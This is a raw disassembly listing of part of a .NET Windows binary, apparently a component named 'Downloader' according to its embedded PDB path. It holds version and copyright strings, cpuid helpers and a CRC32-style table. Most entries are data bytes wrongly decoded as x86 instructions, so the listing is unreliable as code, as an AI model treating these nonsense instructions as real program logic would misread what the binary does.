   140004c56:	12 43 6f             	adc    0x6f(%rbx),%al
   140004c59:	70 79                	jo     0x140004cd4
   140004c5b:	72 69                	jb     0x140004cc6
   140004c5d:	67 68 74 20 c2 a9    	addr32 push $0xffffffffa9c22074
   140004c63:	20 20                	and    %ah,(%rax)
   140004c65:	32 30                	xor    (%rax),%dh
   140004c67:	32 31                	xor    (%rcx),%dh
   140004c69:	00 00                	add    %al,(%rax)
   140004c6b:	29 01                	sub    %eax,(%rcx)
   140004c6d:	00 24 30             	add    %ah,(%rax,%rsi,1)
   140004c70:	63 36                	movsxd (%rsi),%esi
   140004c72:	64 33 33             	xor    %fs:(%rbx),%esi
   140004c75:	33 38                	xor    (%rax),%edi
   140004c77:	2d 63 35 61 63       	sub    $0x63613563,%eax
   140004c7c:	2d 34 65 33 31       	sub    $0x31336534,%eax
   140004c81:	2d 62 34 63 37       	sub    $0x37633462,%eax
   140004c86:	2d 66 64 62 36       	sub    $0x36626466,%eax
   140004c8b:	38 66 36             	cmp    %ah,0x36(%rsi)
   140004c8e:	64 66 64 62 36 00 00 	(bad)
   140004c95:	0c 
   140004c96:	01 00                	add    %eax,(%rax)
   140004c98:	07                   	(bad)
   140004c99:	31 2e                	xor    %ebp,(%rsi)
   140004c9b:	30 2e                	xor    %ch,(%rsi)
   140004c9d:	30 2e                	xor    %ch,(%rsi)
   140004c9f:	30 00                	xor    %al,(%rax)
   140004ca1:	00 49 01             	add    %cl,0x1(%rcx)
   140004ca4:	00 1a                	add    %bl,(%rdx)
   140004ca6:	2e 4e                	cs rex.WRX
   140004ca8:	45 54                	rex.RB push %r12
   140004caa:	46 72 61             	rex.RX jb 0x140004d0e
   140004cad:	6d                   	insl   (%dx),(%rdi)
   140004cae:	65 77 6f             	gs ja  0x140004d20
   140004cb1:	72 6b                	jb     0x140004d1e
   140004cb3:	2c 56                	sub    $0x56,%al
   140004cb5:	65 72 73             	gs jb  0x140004d2b
   140004cb8:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%rdi),%ebp
   140004cbf:	38 01                	cmp    %al,(%rcx)
   140004cc1:	00 54 0e 14          	add    %dl,0x14(%rsi,%rcx,1)
   140004cc5:	46 72 61             	rex.RX jb 0x140004d29
   140004cc8:	6d                   	insl   (%dx),(%rdi)
   140004cc9:	65 77 6f             	gs ja  0x140004d3b
   140004ccc:	72 6b                	jb     0x140004d39
   140004cce:	44 69 73 70 6c 61 79 	imul   $0x4e79616c,0x70(%rbx),%r14d
   140004cd5:	4e 
   140004cd6:	61                   	(bad)
   140004cd7:	6d                   	insl   (%dx),(%rdi)
   140004cd8:	65 12 2e             	adc    %gs:(%rsi),%ch
   140004cdb:	4e                   	rex.WRX
   140004cdc:	45 54                	rex.RB push %r12
   140004cde:	20 46 72             	and    %al,0x72(%rsi)
   140004ce1:	61                   	(bad)
   140004ce2:	6d                   	insl   (%dx),(%rdi)
   140004ce3:	65 77 6f             	gs ja  0x140004d55
   140004ce6:	72 6b                	jb     0x140004d53
   140004ce8:	20 34 2e             	and    %dh,(%rsi,%rbp,1)
   140004ceb:	38 00                	cmp    %al,(%rax)
   140004ced:	00 00                	add    %al,(%rax)
   140004cef:	00 34 d0             	add    %dh,(%rax,%rdx,8)
   140004cf2:	12 80 00 00 00 00    	adc    0x0(%rax),%al
   140004cf8:	02 00                	add    (%rax),%al
   140004cfa:	00 00                	add    %al,(%rax)
   140004cfc:	66 00 00             	data16 add %al,(%rax)
   140004cff:	00 24 4d 00 00 24 2f 	add    %ah,0x2f240000(,%rcx,2)
	...
   140004d12:	00 00                	add    %al,(%rax)
   140004d14:	10 00                	adc    %al,(%rax)
	...
   140004d22:	00 00                	add    %al,(%rax)
   140004d24:	52                   	push   %rdx
   140004d25:	53                   	push   %rbx
   140004d26:	44 53                	rex.R push %rbx
   140004d28:	ae                   	scas   (%rdi),%al
   140004d29:	0f 5f e7             	maxps  %xmm7,%xmm4
   140004d2c:	b1 a3                	mov    $0xa3,%cl
   140004d2e:	8a 4e 91             	mov    -0x6f(%rsi),%cl
   140004d31:	73 45                	jae    0x140004d78
   140004d33:	20 c2                	and    %al,%dl
   140004d35:	cf                   	iret
   140004d36:	ec                   	in     (%dx),%al
   140004d37:	6f                   	outsl  (%rsi),(%dx)
   140004d38:	01 00                	add    %eax,(%rax)
   140004d3a:	00 00                	add    %al,(%rax)
   140004d3c:	44 3a 5c 43 6f       	cmp    0x6f(%rbx,%rax,2),%r11b
   140004d41:	64 65 5c             	fs gs pop %rsp
   140004d44:	46 75 63             	rex.RX jne 0x140004daa
   140004d47:	6b 65 72 5c          	imul   $0x5c,0x72(%rbp),%esp
   140004d4b:	47 61                	rex.RXB (bad)
   140004d4d:	6d                   	insl   (%dx),(%rdi)
   140004d4e:	65 50                	gs push %rax
   140004d50:	6c                   	insb   (%dx),(%rdi)
   140004d51:	61                   	(bad)
   140004d52:	79 65                	jns    0x140004db9
   140004d54:	72 46                	jb     0x140004d9c
   140004d56:	72 61                	jb     0x140004db9
   140004d58:	6d                   	insl   (%dx),(%rdi)
   140004d59:	65 77 6f             	gs ja  0x140004dcb
   140004d5c:	72 6b                	jb     0x140004dc9
   140004d5e:	5c                   	pop    %rsp
   140004d5f:	54                   	push   %rsp
   140004d60:	69 66 61 5c 44 6f 77 	imul   $0x776f445c,0x61(%rsi),%esp
   140004d67:	6e                   	outsb  (%rsi),(%dx)
   140004d68:	6c                   	insb   (%dx),(%rdi)
   140004d69:	6f                   	outsl  (%rsi),(%dx)
   140004d6a:	61                   	(bad)
   140004d6b:	64 65 72 5c          	fs gs jb 0x140004dcb
   140004d6f:	6f                   	outsl  (%rsi),(%dx)
   140004d70:	62 6a 5c 52 65       	(bad)
   140004d75:	6c                   	insb   (%dx),(%rdi)
   140004d76:	65 61                	gs (bad)
   140004d78:	73 65                	jae    0x140004ddf
   140004d7a:	5c                   	pop    %rsp
   140004d7b:	44 6f                	rex.R outsl (%rsi),(%dx)
   140004d7d:	77 6e                	ja     0x140004ded
   140004d7f:	6c                   	insb   (%dx),(%rdi)
   140004d80:	6f                   	outsl  (%rsi),(%dx)
   140004d81:	61                   	(bad)
   140004d82:	64 65 72 2e          	fs gs jb 0x140004db4
   140004d86:	70 64                	jo     0x140004dec
   140004d88:	62                   	(bad)
   140004d89:	00 53 49             	add    %dl,0x49(%rbx)
   140004d8c:	89 d0                	mov    %edx,%eax
   140004d8e:	89 c8                	mov    %ecx,%eax
   140004d90:	0f a2                	cpuid
   140004d92:	41 89 40 00          	mov    %eax,0x0(%r8)
   140004d96:	41 89 58 04          	mov    %ebx,0x4(%r8)
   140004d9a:	41 89 48 08          	mov    %ecx,0x8(%r8)
   140004d9e:	41 89 50 0c          	mov    %edx,0xc(%r8)
   140004da2:	5b                   	pop    %rbx
   140004da3:	c3                   	ret
   140004da4:	00 00                	add    %al,(%rax)
   140004da6:	00 00                	add    %al,(%rax)
   140004da8:	00 00                	add    %al,(%rax)
   140004daa:	55                   	push   %rbp
   140004dab:	8b ec                	mov    %esp,%ebp
   140004dad:	53                   	push   %rbx
   140004dae:	57                   	push   %rdi
   140004daf:	8b 45 08             	mov    0x8(%rbp),%eax
   140004db2:	0f a2                	cpuid
   140004db4:	8b 7d 0c             	mov    0xc(%rbp),%edi
   140004db7:	89 07                	mov    %eax,(%rdi)
   140004db9:	89 5f 04             	mov    %ebx,0x4(%rdi)
   140004dbc:	89 4f 08             	mov    %ecx,0x8(%rdi)
   140004dbf:	89 57 0c             	mov    %edx,0xc(%rdi)
   140004dc2:	5f                   	pop    %rdi
   140004dc3:	5b                   	pop    %rbx
   140004dc4:	8b e5                	mov    %ebp,%esp
   140004dc6:	5d                   	pop    %rbp
   140004dc7:	c3                   	ret
	...
   140004dd0:	00 00                	add    %al,(%rax)
   140004dd2:	96                   	xchg   %eax,%esi
   140004dd3:	30 07                	xor    %al,(%rdi)
   140004dd5:	77 00                	ja     0x140004dd7
   140004dd7:	00 00                	add    %al,(%rax)
   140004dd9:	00 2c 61             	add    %ch,(%rcx,%riz,2)
   140004ddc:	0e                   	(bad)
   140004ddd:	ee                   	out    %al,(%dx)
   140004dde:	00 00                	add    %al,(%rax)
   140004de0:	00 00                	add    %al,(%rax)
   140004de2:	ba 51 09 99 00       	mov    $0x990951,%edx
   140004de7:	00 00                	add    %al,(%rax)
   140004de9:	00 19                	add    %bl,(%rcx)
   140004deb:	c4                   	(bad)
   140004dec:	6d                   	insl   (%dx),(%rdi)
   140004ded:	07                   	(bad)
   140004dee:	00 00                	add    %al,(%rax)
   140004df0:	00 00                	add    %al,(%rax)
   140004df2:	8f                   	(bad)
   140004df3:	f4                   	hlt
   140004df4:	6a 70                	push   $0x70
   140004df6:	00 00                	add    %al,(%rax)
   140004df8:	00 00                	add    %al,(%rax)
   140004dfa:	35 a5 63 e9 00       	xor    $0xe963a5,%eax
   140004dff:	00 00                	add    %al,(%rax)
   140004e01:	00 a3 95 64 9e 00    	add    %ah,0x9e6495(%rbx)
   140004e07:	00 00                	add    %al,(%rax)
   140004e09:	00 32                	add    %dh,(%rdx)
   140004e0b:	88 db                	mov    %bl,%bl
   140004e0d:	0e                   	(bad)
   140004e0e:	00 00                	add    %al,(%rax)
   140004e10:	00 00                	add    %al,(%rax)
   140004e12:	a4                   	movsb  (%rsi),(%rdi)
   140004e13:	b8 dc 79 00 00       	mov    $0x79dc,%eax
   140004e18:	00 00                	add    %al,(%rax)
   140004e1a:	1e                   	(bad)
   140004e1b:	e9 d5 e0 00 00       	jmp    0x140012ef5
   140004e20:	00 00                	add    %al,(%rax)
   140004e22:	88 d9                	mov    %bl,%cl
   140004e24:	d2 97 00 00 00 00    	rclb   %cl,0x0(%rdi)
   140004e2a:	2b 4c b6 09          	sub    0x9(%rsi,%rsi,4),%ecx
   140004e2e:	00 00                	add    %al,(%rax)
   140004e30:	00 00                	add    %al,(%rax)
   140004e32:	bd 7c b1 7e 00       	mov    $0x7eb17c,%ebp
   140004e37:	00 00                	add    %al,(%rax)
   140004e39:	00 07                	add    %al,(%rdi)
   140004e3b:	2d b8 e7 00 00       	sub    $0xe7b8,%eax
   140004e40:	00 00                	add    %al,(%rax)
   140004e42:	91                   	xchg   %eax,%ecx
   140004e43:	1d bf 90 00 00       	sbb    $0x90bf,%eax
   140004e48:	00 00                	add    %al,(%rax)
   140004e4a:	64 10 b7 1d 00 00 00 	adc    %dh,%fs:0x1d(%rdi)
   140004e51:	00 f2                	add    %dh,%dl
   140004e53:	20 b0 6a 00 00 00    	and    %dh,0x6a(%rax)
   140004e59:	00 48 71             	add    %cl,0x71(%rax)
   140004e5c:	b9 f3 00 00 00       	mov    $0xf3,%ecx
   140004e61:	00 de                	add    %bl,%dh
   140004e63:	41 be 84 00 00 00    	mov    $0x84,%r14d
   140004e69:	00 7d d4             	add    %bh,-0x2c(%rbp)
   140004e6c:	da 1a                	ficompl (%rdx)
   140004e6e:	00 00                	add    %al,(%rax)
   140004e70:	00 00                	add    %al,(%rax)
   140004e72:	eb e4                	jmp    0x140004e58
   140004e74:	dd 6d 00             	(bad) 0x0(%rbp)
   140004e77:	00 00                	add    %al,(%rax)
   140004e79:	00 51 b5             	add    %dl,-0x4b(%rcx)
   140004e7c:	d4                   	(bad)
   140004e7d:	f4                   	hlt
   140004e7e:	00 00                	add    %al,(%rax)
   140004e80:	00 00                	add    %al,(%rax)
   140004e82:	c7 85 d3 83 00 00 00 	movl   $0x98560000,0x83d3(%rbp)
   140004e89:	00 56 98 
   140004e8c:	6c                   	insb   (%dx),(%rdi)
   140004e8d:	13 00                	adc    (%rax),%eax
   140004e8f:	00 00                	add    %al,(%rax)
   140004e91:	00 c0                	add    %al,%al
   140004e93:	a8 6b                	test   $0x6b,%al
   140004e95:	64 00 00             	add    %al,%fs:(%rax)
   140004e98:	00 00                	add    %al,(%rax)
   140004e9a:	7a f9                	jp     0x140004e95
   140004e9c:	62 fd 00 00 00       	(bad)
   140004ea1:	00 ec                	add    %ch,%ah
   140004ea3:	c9                   	leave
   140004ea4:	65 8a 00             	mov    %gs:(%rax),%al
   140004ea7:	00 00                	add    %al,(%rax)
   140004ea9:	00 4f 5c             	add    %cl,0x5c(%rdi)
   140004eac:	01 14 00             	add    %edx,(%rax,%rax,1)
   140004eaf:	00 00                	add    %al,(%rax)
   140004eb1:	00 d9                	add    %bl,%cl
   140004eb3:	6c                   	insb   (%dx),(%rdi)
   140004eb4:	06                   	(bad)
   140004eb5:	63 00                	movsxd (%rax),%eax
   140004eb7:	00 00                	add    %al,(%rax)
   140004eb9:	00 63 3d             	add    %ah,0x3d(%rbx)
   140004ebc:	0f fa 00             	psubd  (%rax),%mm0
   140004ebf:	00 00                	add    %al,(%rax)
   140004ec1:	00 f5                	add    %dh,%ch
   140004ec3:	0d 08 8d 00 00       	or     $0x8d08,%eax
   140004ec8:	00 00                	add    %al,(%rax)
   140004eca:	c8 20 6e 3b          	enter  $0x6e20,$0x3b
   140004ece:	00 00                	add    %al,(%rax)
   140004ed0:	00 00                	add    %al,(%rax)
   140004ed2:	5e                   	pop    %rsi
   140004ed3:	10 69 4c             	adc    %ch,0x4c(%rcx)
   140004ed6:	00 00                	add    %al,(%rax)
   140004ed8:	00 00                	add    %al,(%rax)
   140004eda:	e4 41                	in     $0x41,%al
   140004edc:	60                   	(bad)
   140004edd:	d5 00 00 00          	{rex2 0x0} add %al,(%rax)
   140004ee1:	00 72 71             	add    %dh,0x71(%rdx)
   140004ee4:	67 a2 00 00 00 00    	addr32 mov %al,0x0
   140004eea:	d1 e4                	shl    $1,%esp
   140004eec:	03 3c 00             	add    (%rax,%rax,1),%edi
   140004eef:	00 00                	add    %al,(%rax)
   140004ef1:	00 47 d4             	add    %al,-0x2c(%rdi)
   140004ef4:	04 4b                	add    $0x4b,%al
   140004ef6:	00 00                	add    %al,(%rax)
   140004ef8:	00 00                	add    %al,(%rax)
   140004efa:	fd                   	std
   140004efb:	85 0d d2 00 00 00    	test   %ecx,0xd2(%rip)        # 0x140004fd3
   140004f01:	00 6b b5             	add    %ch,-0x4b(%rbx)
   140004f04:	0a a5 00 00 00 00    	or     0x0(%rbp),%ah
   140004f0a:	fa                   	cli
   140004f0b:	a8 b5                	test   $0xb5,%al
   140004f0d:	35 00 00 00 00       	xor    $0x0,%eax
   140004f12:	6c                   	insb   (%dx),(%rdi)
   140004f13:	98                   	cwtl
   140004f14:	b2 42                	mov    $0x42,%dl
   140004f16:	00 00                	add    %al,(%rax)
   140004f18:	00 00                	add    %al,(%rax)
   140004f1a:	d6                   	udb
   140004f1b:	c9                   	leave
   140004f1c:	bb db 00 00 00       	mov    $0xdb,%ebx
   140004f21:	00 40 f9             	add    %al,-0x7(%rax)
   140004f24:	bc ac 00 00 00       	mov    $0xac,%esp
   140004f29:	00 e3                	add    %ah,%bl
   140004f2b:	6c                   	insb   (%dx),(%rdi)
   140004f2c:	d8 32                	fdivs  (%rdx)
   140004f2e:	00 00                	add    %al,(%rax)
   140004f30:	00 00                	add    %al,(%rax)
   140004f32:	75 5c                	jne    0x140004f90
   140004f34:	df 45 00             	filds  0x0(%rbp)
   140004f37:	00 00                	add    %al,(%rax)
   140004f39:	00 cf                	add    %cl,%bh
   140004f3b:	0d d6 dc 00 00       	or     $0xdcd6,%eax
   140004f40:	00 00                	add    %al,(%rax)
   140004f42:	59                   	pop    %rcx
   140004f43:	3d d1 ab 00 00       	cmp    $0xabd1,%eax
   140004f48:	00 00                	add    %al,(%rax)
   140004f4a:	ac                   	lods   (%rsi),%al
   140004f4b:	30 d9                	xor    %bl,%cl
   140004f4d:	26 00 00             	es add %al,(%rax)
   140004f50:	00 00                	add    %al,(%rax)
   140004f52:	3a 00                	cmp    (%rax),%al
   140004f54:	de 51 00             	ficoms 0x0(%rcx)
   140004f57:	00 00                	add    %al,(%rax)
   140004f59:	00 80 51 d7 c8 00    	add    %al,0xc8d751(%rax)
   140004f5f:	00 00                	add    %al,(%rax)
   140004f61:	00 16                	add    %dl,(%rsi)
   140004f63:	61                   	(bad)
   140004f64:	d0 bf 00 00 00 00    	sarb   $1,0x0(%rdi)
   140004f6a:	b5 f4                	mov    $0xf4,%ch
   140004f6c:	b4 21                	mov    $0x21,%ah
   140004f6e:	00 00                	add    %al,(%rax)
   140004f70:	00 00                	add    %al,(%rax)
   140004f72:	23 c4                	and    %esp,%eax
   140004f74:	b3 56                	mov    $0x56,%bl
   140004f76:	00 00                	add    %al,(%rax)
   140004f78:	00 00                	add    %al,(%rax)
   140004f7a:	99                   	cltd
   140004f7b:	95                   	xchg   %eax,%ebp
   140004f7c:	ba cf 00 00 00       	mov    $0xcf,%edx
   140004f81:	00 0f                	add    %cl,(%rdi)
   140004f83:	a5                   	movsl  (%rsi),(%rdi)
   140004f84:	bd b8 00 00 00       	mov    $0xb8,%ebp
   140004f89:	00 9e b8 02 28 00    	add    %bl,0x2802b8(%rsi)
   140004f8f:	00 00                	add    %al,(%rax)
   140004f91:	00 08                	add    %cl,(%rax)
   140004f93:	88 05 5f 00 00 00    	mov    %al,0x5f(%rip)        # 0x140004ff8
   140004f99:	00 b2 d9 0c c6 00    	add    %dh,0xc60cd9(%rdx)
   140004f9f:	00 00                	add    %al,(%rax)
   140004fa1:	00 24 e9             	add    %ah,(%rcx,%rbp,8)
   140004fa4:	0b b1 00 00 00 00    	or     0x0(%rcx),%esi
   140004faa:	87 7c 6f 2f          	xchg   %edi,0x2f(%rdi,%rbp,2)
   140004fae:	00 00                	add    %al,(%rax)
   140004fb0:	00 00                	add    %al,(%rax)
   140004fb2:	11 4c 68 58          	adc    %ecx,0x58(%rax,%rbp,2)
   140004fb6:	00 00                	add    %al,(%rax)
   140004fb8:	00 00                	add    %al,(%rax)
   140004fba:	ab                   	stos   %eax,(%rdi)
   140004fbb:	1d 61 c1 00 00       	sbb    $0xc161,%eax
   140004fc0:	00 00                	add    %al,(%rax)
   140004fc2:	3d 2d 66 b6 00       	cmp    $0xb6662d,%eax
   140004fc7:	00 00                	add    %al,(%rax)
   140004fc9:	00 90 41 dc 76 00    	add    %dl,0x76dc41(%rax)
   140004fcf:	00 00                	add    %al,(%rax)
   140004fd1:	00 06                	add    %al,(%rsi)
   140004fd3:	71 db                	jno    0x140004fb0
   140004fd5:	01 00                	add    %eax,(%rax)
   140004fd7:	00 00                	add    %al,(%rax)
   140004fd9:	00 bc 20 d2 98 00 00 	add    %bh,0x98d2(%rax,%riz,1)
   140004fe0:	00 00                	add    %al,(%rax)
   140004fe2:	2a 10                	sub    (%rax),%dl
   140004fe4:	d5 ef 00 00          	{rex2 0xef} sldt (%r8)
   140004fe8:	00 00                	add    %al,(%rax)
   140004fea:	89 85 b1 71 00 00    	mov    %eax,0x71b1(%rbp)
   140004ff0:	00 00                	add    %al,(%rax)
   140004ff2:	1f                   	(bad)
   140004ff3:	b5 b6                	mov    $0xb6,%ch
   140004ff5:	06                   	(bad)
   140004ff6:	00 00                	add    %al,(%rax)
   140004ff8:	00 00                	add    %al,(%rax)
   140004ffa:	a5                   	movsl  (%rsi),(%rdi)
   140004ffb:	e4 bf                	in     $0xbf,%al
   140004ffd:	9f                   	lahf
   140004ffe:	00 00                	add    %al,(%rax)
   140005000:	00 00                	add    %al,(%rax)
   140005002:	33 d4                	xor    %esp,%edx
   140005004:	b8 e8 00 00 00       	mov    $0xe8,%eax
   140005009:	00 a2 c9 07 78 00    	add    %ah,0x7807c9(%rdx)
   14000500f:	00 00                	add    %al,(%rax)
   140005011:	00 34 f9             	add    %dh,(%rcx,%rdi,8)
   140005014:	00 0f                	add    %cl,(%rdi)
   140005016:	00 00                	add    %al,(%rax)
   140005018:	00 00                	add    %al,(%rax)
   14000501a:	8e a8 09 96 00 00    	mov    0x9609(%rax),%gs
   140005020:	00 00                	add    %al,(%rax)
   140005022:	18 98 0e e1 00 00    	sbb    %bl,0xe10e(%rax)
   140005028:	00 00                	add    %al,(%rax)
   14000502a:	bb 0d 6a 7f 00       	mov    $0x7f6a0d,%ebx
   14000502f:	00 00                	add    %al,(%rax)
   140005031:	00 2d 3d 6d 08 00    	add    %ch,0x86d3d(%rip)        # 0x14008bd74
   140005037:	00 00                	add    %al,(%rax)
   140005039:	00 97 6c 64 91 00    	add    %dl,0x91646c(%rdi)
   14000503f:	00 00                	add    %al,(%rax)
   140005041:	00 01                	add    %al,(%rcx)
   140005043:	5c                   	pop    %rsp
   140005044:	63 e6                	movsxd %esi,%esp
   140005046:	00 00                	add    %al,(%rax)
   140005048:	00 00                	add    %al,(%rax)
   14000504a:	f4                   	hlt
   14000504b:	51                   	push   %rcx
   14000504c:	6b 6b 00 00          	imul   $0x0,0x0(%rbx),%ebp
   140005050:	00 00                	add    %al,(%rax)
   140005052:	62 61 6c 1c 00       	(bad)
   140005057:	00 00                	add    %al,(%rax)
   140005059:	00 d8                	add    %bl,%al
   14000505b:	30 65 85             	xor    %ah,-0x7b(%rbp)
   14000505e:	00 00                	add    %al,(%rax)
   140005060:	00 00                	add    %al,(%rax)
   140005062:	4e 00 62 f2          	rex.WRX add %r12b,-0xe(%rdx)
   140005066:	00 00                	add    %al,(%rax)
   140005068:	00 00                	add    %al,(%rax)
   14000506a:	ed                   	in     (%dx),%eax
   14000506b:	95                   	xchg   %eax,%ebp
   14000506c:	06                   	(bad)
   14000506d:	6c                   	insb   (%dx),(%rdi)
   14000506e:	00 00                	add    %al,(%rax)
   140005070:	00 00                	add    %al,(%rax)
   140005072:	7b a5                	jnp    0x140005019
   140005074:	01 1b                	add    %ebx,(%rbx)
   140005076:	00 00                	add    %al,(%rax)
   140005078:	00 00                	add    %al,(%rax)
   14000507a:	c1 f4 08             	shl    $0x8,%esp
   14000507d:	82                   	(bad)
   14000507e:	00 00                	add    %al,(%rax)
   140005080:	00 00                	add    %al,(%rax)
   140005082:	57                   	push   %rdi
   140005083:	c4                   	(bad)
   140005084:	0f f5 00             	pmaddwd (%rax),%mm0
   140005087:	00 00                	add    %al,(%rax)
   140005089:	00 c6                	add    %al,%dh
   14000508b:	d9 b0 65 00 00 00    	fnstenv 0x65(%rax)
   140005091:	00 50 e9             	add    %dl,-0x17(%rax)
   140005094:	b7 12                	mov    $0x12,%bh
   140005096:	00 00                	add    %al,(%rax)
   140005098:	00 00                	add    %al,(%rax)
   14000509a:	ea                   	(bad)
   14000509b:	b8 be 8b 00 00       	mov    $0x8bbe,%eax
   1400050a0:	00 00                	add    %al,(%rax)
   1400050a2:	7c 88                	jl     0x14000502c
   1400050a4:	b9 fc 00 00 00       	mov    $0xfc,%ecx
   1400050a9:	00 df                	add    %bl,%bh
   1400050ab:	1d dd 62 00 00       	sbb    $0x62dd,%eax
   1400050b0:	00 00                	add    %al,(%rax)
   1400050b2:	49 2d da 15 00 00    	rex.WB sub $0x15da,%rax
   1400050b8:	00 00                	add    %al,(%rax)
   1400050ba:	f3 7c d3             	repz jl 0x140005090
   1400050bd:	8c 00                	mov    %es,(%rax)
   1400050bf:	00 00                	add    %al,(%rax)
   1400050c1:	00 65 4c             	add    %ah,0x4c(%rbp)
   1400050c4:	d4                   	(bad)
   1400050c5:	fb                   	sti
   1400050c6:	00 00                	add    %al,(%rax)
   1400050c8:	00 00                	add    %al,(%rax)
   1400050ca:	58                   	pop    %rax
   1400050cb:	61                   	(bad)
   1400050cc:	b2 4d                	mov    $0x4d,%dl
   1400050ce:	00 00                	add    %al,(%rax)
   1400050d0:	00 00                	add    %al,(%rax)
   1400050d2:	ce                   	(bad)
   1400050d3:	51                   	push   %rcx
   1400050d4:	b5 3a                	mov    $0x3a,%ch
   1400050d6:	00 00                	add    %al,(%rax)
   1400050d8:	00 00                	add    %al,(%rax)
   1400050da:	74 00                	je     0x1400050dc
   1400050dc:	bc a3 00 00 00       	mov    $0xa3,%esp
   1400050e1:	00 e2                	add    %ah,%dl
   1400050e3:	30 bb d4 00 00 00    	xor    %bh,0xd4(%rbx)
   1400050e9:	00 41 a5             	add    %al,-0x5b(%rcx)
   1400050ec:	df 4a 00             	fisttps 0x0(%rdx)
   1400050ef:	00 00                	add    %al,(%rax)
   1400050f1:	00 d7                	add    %dl,%bh
   1400050f3:	95                   	xchg   %eax,%ebp
   1400050f4:	d8 3d 00 00 00 00    	fdivrs 0x0(%rip)        # 0x1400050fa
   1400050fa:	6d                   	insl   (%dx),(%rdi)
   1400050fb:	c4                   	(bad)
   1400050fc:	d1 a4 00 00 00 00 fb 	shll   $1,-0x5000000(%rax,%rax,1)
   140005103:	f4                   	hlt
   140005104:	d6                   	udb
   140005105:	d3 00                	roll   %cl,(%rax)
   140005107:	00 00                	add    %al,(%rax)
   140005109:	00 6a e9             	add    %ch,-0x17(%rdx)
   14000510c:	69 43 00 00 00 00 fc 	imul   $0xfc000000,0x0(%rbx),%eax
   140005113:	d9 6e 34             	fldcw  0x34(%rsi)
   140005116:	00 00                	add    %al,(%rax)
   140005118:	00 00                	add    %al,(%rax)
   14000511a:	46 88 67 ad          	rex.RX mov %r12b,-0x53(%rdi)
   14000511e:	00 00                	add    %al,(%rax)
   140005120:	00 00                	add    %al,(%rax)
   140005122:	d0 b8 60 da 00 00    	sarb   $1,0xda60(%rax)
   140005128:	00 00                	add    %al,(%rax)
   14000512a:	73 2d                	jae    0x140005159
   14000512c:	04 44                	add    $0x44,%al
   14000512e:	00 00                	add    %al,(%rax)
   140005130:	00 00                	add    %al,(%rax)
   140005132:	e5 1d                	in     $0x1d,%eax
   140005134:	03 33                	add    (%rbx),%esi
   140005136:	00 00                	add    %al,(%rax)
   140005138:	00 00                	add    %al,(%rax)
   14000513a:	5f                   	pop    %rdi
   14000513b:	4c 0a aa 00 00 00 00 	rex.WR or 0x0(%rdx),%r13b
   140005142:	c9                   	leave
   140005143:	7c 0d                	jl     0x140005152
   140005145:	dd 00                	fldl   (%rax)
   140005147:	00 00                	add    %al,(%rax)
   140005149:	00 3c 71             	add    %bh,(%rcx,%rsi,2)
   14000514c:	05 50 00 00 00       	add    $0x50,%eax
   140005151:	00 aa 41 02 27 00    	add    %ch,0x270241(%rdx)
   140005157:	00 00                	add    %al,(%rax)
   140005159:	00 10                	add    %dl,(%rax)
   14000515b:	10 0b                	adc    %cl,(%rbx)
   14000515d:	be 00 00 00 00       	mov    $0x0,%esi
   140005162:	86 20                	xchg   %ah,(%rax)
   140005164:	0c c9                	or     $0xc9,%al
   140005166:	00 00                	add    %al,(%rax)
   140005168:	00 00                	add    %al,(%rax)
   14000516a:	25 b5 68 57 00       	and    $0x5768b5,%eax
   14000516f:	00 00                	add    %al,(%rax)
   140005171:	00 b3 85 6f 20 00    	add    %dh,0x206f85(%rbx)
   140005177:	00 00                	add    %al,(%rax)
   140005179:	00 09                	add    %cl,(%rcx)
   14000517b:	d4                   	(bad)
   14000517c:	66 b9 00 00          	mov    $0x0,%cx
   140005180:	00 00                	add    %al,(%rax)
   140005182:	9f                   	lahf
   140005183:	e4 61                	in     $0x61,%al
   140005185:	ce                   	(bad)
   140005186:	00 00                	add    %al,(%rax)
   140005188:	00 00                	add    %al,(%rax)
   14000518a:	0e                   	(bad)
   14000518b:	f9                   	stc
   14000518c:	de 5e 00             	ficomps 0x0(%rsi)
   14000518f:	00 00                	add    %al,(%rax)
   140005191:	00 98 c9 d9 29 00    	add    %bl,0x29d9c9(%rax)
   140005197:	00 00                	add    %al,(%rax)
   140005199:	00 22                	add    %ah,(%rdx)
   14000519b:	98                   	cwtl
   14000519c:	d0 b0 00 00 00 00    	shlb   $1,0x0(%rax)
   1400051a2:	b4 a8                	mov    $0xa8,%ah
   1400051a4:	d7                   	xlat   (%rbx)
   1400051a5:	c7 00 00 00 00 17    	movl   $0x17000000,(%rax)
   1400051ab:	3d b3 59 00 00       	cmp    $0x59b3,%eax
   1400051b0:	00 00                	add    %al,(%rax)
   1400051b2:	81 0d b4 2e 00 00 00 	orl    $0x5c3b0000,0x2eb4(%rip)        # 0x140008070
   1400051b9:	00 3b 5c 
   1400051bc:	bd b7 00 00 00       	mov    $0xb7,%ebp
   1400051c1:	00 ad 6c ba c0 00    	add    %ch,0xc0ba6c(%rbp)
   1400051c7:	00 00                	add    %al,(%rax)
   1400051c9:	00 20                	add    %ah,(%rax)
   1400051cb:	83 b8 ed 00 00 00 00 	cmpl   $0x0,0xed(%rax)
   1400051d2:	b6 b3                	mov    $0xb3,%dh
   1400051d4:	bf 9a 00 00 00       	mov    $0x9a,%edi
   1400051d9:	00 0c e2             	add    %cl,(%rdx,%riz,8)
   1400051dc:	b6 03                	mov    $0x3,%dh
   1400051de:	00 00                	add    %al,(%rax)
   1400051e0:	00 00                	add    %al,(%rax)
   1400051e2:	9a                   	(bad)
   1400051e3:	d2 b1 74 00 00 00    	shlb   %cl,0x74(%rcx)
   1400051e9:	00 39                	add    %bh,(%rcx)
   1400051eb:	47                   	rex.RXB
   1400051ec:	d5 ea 00 00          	{rex2 0xea} sldt (%rax)
   1400051f0:	00 00                	add    %al,(%rax)
   1400051f2:	af                   	scas   (%rdi),%eax
   1400051f3:	77 d2                	ja     0x1400051c7
   1400051f5:	9d                   	popf
   1400051f6:	00 00                	add    %al,(%rax)
   1400051f8:	00 00                	add    %al,(%rax)
   1400051fa:	15 26 db 04 00       	adc    $0x4db26,%eax
   1400051ff:	00 00                	add    %al,(%rax)
   140005201:	00 83 16 dc 73 00    	add    %al,0x73dc16(%rbx)
   140005207:	00 00                	add    %al,(%rax)
   140005209:	00 12                	add    %dl,(%rdx)
   14000520b:	0b 63 e3             	or     -0x1d(%rbx),%esp
   14000520e:	00 00                	add    %al,(%rax)
   140005210:	00 00                	add    %al,(%rax)
   140005212:	84 3b                	test   %bh,(%rbx)
   140005214:	64 94                	fs xchg %eax,%esp
   140005216:	00 00                	add    %al,(%rax)
